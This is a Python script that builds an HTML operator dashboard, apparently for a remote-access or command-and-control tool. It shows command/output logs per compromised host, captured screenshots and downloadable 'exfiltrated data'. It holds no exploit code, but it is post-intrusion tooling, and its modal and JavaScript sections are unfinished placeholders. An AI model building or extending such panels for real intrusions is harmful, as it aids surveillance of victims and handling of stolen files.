import os
import sys
import json
from datetime import datetime
import filetype

CONFIG = {
    "TITLE": "MBEUBEU REPORT",
    "THEME": {
        "PRIMARY": "#2A9FD6",
        "SECONDARY": "#28A745",
        "BACKGROUND": "#1A1A1A",
        "TEXT": "#FFFFFF"
    },
    "PATHS": {
        "LOGS_DIR": "files/Downloads/logs",
        "SCREENSHOTS_DIR": "files/Downloads/screenshots",
        "EXFILTRATED_DIR": "files/Downloads/exfiltrated_data",
        "OUTPUT_HTML": "index.html"
    }
}

def load_bayefalls():
    """Load and process bayefall data with command/output pairing"""
    bayefalls = []
    logs_dir = CONFIG["PATHS"]["LOGS_DIR"]
    
    if not os.path.exists(logs_dir):
        print(f"Warning: Logs directory not found - {logs_dir}")
        return bayefalls

    for bayefall_name in os.listdir(logs_dir):
        bayefall_path = os.path.join(logs_dir, bayefall_name)
        log_file = os.path.join(bayefall_path, "log.json")
        
        if os.path.isfile(log_file):
            try:
                with open(log_file, 'r') as f:
                    logs = json.load(f)
                
                operations = []
                current_command = None
                
                for log in logs:
                    if log.get('type') == 'command':
                        current_command = {
                            'time': log.get('time'),
                            'command': log.get('data', {}).get('command', ''),
                            'output_time': None,
                            'output': None
                        }
                    elif log.get('type') == 'output' and current_command:
                        current_command['output_time'] = log.get('time')
                        current_command['output'] = log.get('data', '').replace('\r\n', '<br>')
                        operations.append(current_command)
                        current_command = None
                
                bayefalls.append({
                    'name': bayefall_name,
                    'operations': operations[-10:]
                })
                
            except Exception as e:
                print(f"Error loading {log_file}: {str(e)}")
    
    return bayefalls

def get_screenshots():
    """Get sorted screenshots with thumbnails"""
    screenshots = []
    ss_dir = CONFIG["PATHS"]["SCREENSHOTS_DIR"]
    
    if os.path.exists(ss_dir):
        for filename in sorted(os.listdir(ss_dir)):
            if filename.lower().endswith(('.png', '.jpg', '.jpeg')):
                screenshots.append({
                    'name': filename,
                    'path': os.path.join("files", "Downloads", "screenshots", filename)
                })
    return screenshots

def get_exfiltrated_files():
    """Get categorized exfiltrated files with metadata"""
    exfil_data = []
    exfil_dir = CONFIG["PATHS"]["EXFILTRATED_DIR"]
    
    if os.path.exists(exfil_dir):
        for filename in sorted(os.listdir(exfil_dir)):
            file_path = os.path.join(exfil_dir, filename)
            if os.path.isfile(file_path):
                try:
                    file_stat = os.stat(file_path)
                    ftype = filetype.guess(file_path)
                    
                    exfil_data.append({
                        'name': filename,
                        'path': os.path.join("files", "Downloads", "exfiltrated_data", filename),
                        'size': sizeof_fmt(file_stat.st_size),
                        'mtime': datetime.fromtimestamp(file_stat.st_mtime).strftime('%Y-%m-%d %H:%M:%S'),
                        'type': ftype.mime if ftype else 'unknown',
                        'icon': get_file_icon(ftype)
                    })
                except Exception as e:
                    print(f"Error processing {file_path}: {str(e)}")
    return exfil_data

def sizeof_fmt(num, suffix="B"):
    """Convert bytes to human-readable format"""
    for unit in ["", "K", "M", "G", "T", "P", "E", "Z"]:
        if abs(num) < 1024.0:
            return f"{num:3.1f}{unit}{suffix}"
        num /= 1024.0
    return f"{num:.1f}Yi{suffix}"

def get_file_icon(ftype):
    """Get Bootstrap icon based on file type"""
    if not ftype:
        return "file-earmark"
    
    type_map = {
        'image/': 'file-image',
        'text/': 'file-text',
        'audio/': 'file-music',
        'video/': 'file-play',
        'application/pdf': 'file-pdf',
        'application/zip': 'file-zip',
        'application/x-rar': 'file-zip',
        'application/x-tar': 'file-zip',
    }
    
    for prefix, icon in type_map.items():
        if ftype.mime.startswith(prefix):
            return icon
    return 'file-earmark'

def generate_html_dashboard(bayefalls, screenshots, exfiltrated):
    """Generate HTML report with all sections"""
    return f"""<!DOCTYPE html>
<html data-bs-theme="dark">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{CONFIG['TITLE']}</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
    <style>
        body {{
            background: {CONFIG['THEME']['BACKGROUND']};
            color: {CONFIG['THEME']['TEXT']};
            font-family: 'Segoe UI', system-ui, sans-serif;
        }}
        
        .bayefall-card {{
            background: rgba(255, 255, 255, 0.05);
            border-left: 4px solid {CONFIG['THEME']['PRIMARY']};
            border-radius: 4px;
            margin: 10px 0;
            padding: 15px;
            transition: all 0.2s;
            cursor: pointer;
        }}
        
        .bayefall-card:hover {{
            transform: translateX(5px);
            background: rgba(255, 255, 255, 0.08);
        }}
        
        .exfil-card {{
            background: rgba(255, 255, 255, 0.03);
            border: 1px solid {CONFIG['THEME']['SECONDARY']};
            border-radius: 8px;
        }}
        
        .command-box {{
            background: rgba(0, 0, 0, 0.3);
            border-radius: 4px;
            padding: 10px;
            margin: 10px 0;
            font-family: 'Courier New', monospace;
        }}
    </style>
</head>
<body>
    <div class="container py-4">
        <h1 class="text-center mb-4">{CONFIG['TITLE']}</h1>
        
        <!-- Active Bayefalls -->
        <div class="row">
            <div class="col-md-8 mx-auto">
                <h4 class="mb-3">🖥️ Active Bayefalls</h4>
                {generate_bayefalls_list(bayefalls)}
            </div>
        </div>
        
        <!-- Screenshots -->
        <div class="row mt-5">
            <div class="col-12">
                <h4 class="mb-3">📸 Screenshots</h4>
                <div class="row g-3">
                    {generate_screenshot_grid(screenshots)}
                </div>
            </div>
        </div>
        
        <!-- Exfiltrated Data -->
        <div class="row mt-5">
            <div class="col-12">
                <h4 class="mb-3">📁 Exfiltrated Data</h4>
                <div class="row g-3">
                    {generate_exfiltrated_grid(exfiltrated)}
                </div>
            </div>
        </div>
    </div>

    <!-- Modals -->
    <div class="modal fade" id="bayefallModal">
        <!-- Keep existing modal structure -->
    </div>

    <div class="modal fade" id="screenshotModal">
        <!-- Keep existing modal structure -->
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
    <script>
        // Keep existing JavaScript functionality
    </script>
</body>
</html>
"""

def generate_bayefalls_list(bayefalls):
    if not bayefalls:
        return '<div class="text-muted">No active bayefalls found</div>'
    
    items = []
    for bayefall in bayefalls:
        last_op = bayefall['operations'][-1] if bayefall['operations'] else {}
        items.append(f"""
        <div class="bayefall-card" onclick="showBayefallDetails('{bayefall['name']}')">
            <div class="d-flex justify-content-between align-items-center">
                <div>
                    <h5 class="mb-0">💻 {bayefall['name']}</h5>
                    <small class="text-muted">
                        Last activity: {last_op.get('time', 'Never')}
                    </small>
                </div>
                <span class="badge bg-primary">
                    {len(bayefall['operations'])} operations
                </span>
            </div>
        </div>
        """)
    return '\n'.join(items)

def generate_screenshot_grid(screenshots):
    if not screenshots:
        return '<div class="text-muted">No screenshots found</div>'
    
    items = []
    for shot in screenshots:
        items.append(f"""
        <div class="col-6 col-md-4 col-lg-3">
            <div class="screenshot-thumb" 
                 data-bs-toggle="modal" 
                 data-bs-target="#screenshotModal"
                 data-full="{shot['path']}">
                <img src="{shot['path']}" 
                     class="img-fluid rounded"
                     loading="lazy">
                <div class="text-truncate small mt-1">{shot['name']}</div>
            </div>
        </div>
        """)
    return '\n'.join(items)

def generate_exfiltrated_grid(exfiltrated):
    if not exfiltrated:
        return '<div class="text-muted">No exfiltrated data found</div>'
    
    items = []
    for item in exfiltrated:
        items.append(f"""
        <div class="col-6 col-md-4 col-lg-3">
            <div class="card exfil-card text-white">
                <div class="card-body">
                    <div class="d-flex align-items-center gap-2 mb-2">
                        <i class="bi bi-{item['icon']} fs-3 text-primary"></i>
                        <div class="flex-grow-1">
                            <div class="text-truncate">{item['name']}</div>
                            <small class="text-muted">{item['size']}</small>
                        </div>
                    </div>
                    <a href="{item['path']}" class="btn btn-sm btn-outline-secondary w-100">
                        <i class="bi bi-download"></i> Download
                    </a>
                </div>
                <div class="card-footer text-muted small">
                    {item['mtime']} • {item['type']}
                </div>
            </div>
        </div>
        """)
    return '\n'.join(items)

def main():
    bayefalls = load_bayefalls()
    screenshots = get_screenshots()
    exfiltrated = get_exfiltrated_files()
    
    with open(CONFIG["PATHS"]["OUTPUT_HTML"], 'w', encoding='utf-8') as f:
        f.write(generate_html_dashboard(bayefalls, screenshots, exfiltrated))
    
    print(f"Report generated: {CONFIG['PATHS']['OUTPUT_HTML']}")

if __name__ == "__main__":
    main()
